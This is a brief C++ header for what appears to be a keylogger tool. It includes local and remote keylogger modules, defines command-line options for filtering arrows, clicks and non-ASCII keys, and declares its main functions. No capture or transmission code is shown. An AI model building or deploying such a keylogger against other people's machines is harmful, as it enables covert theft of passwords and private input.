#ifndef MAIN_HPP_
#define MAIN_HPP_

#include "./keylogger/keylogger.cpp"
#include "./keylogger/keylogger_local/keylogger_local.cpp"
#include "./keylogger/keylogger_remote/keylogger_remote.cpp"

#define LONG_OPTION_NO_ARROW "no_arrow"
#define LONG_OPTION_NO_CLICK "no_click"
#define LONG_OPTION_ASCII_ONLY "ascii_only"
#define LONG_OPTION_MAXIMUM_BUFFER_SIZE "maximum_buffer_size"
#define LONG_OPTION_HELP "help"

void print_help();

void initialize_options(int, char**);

int main(int, char**);

#endif
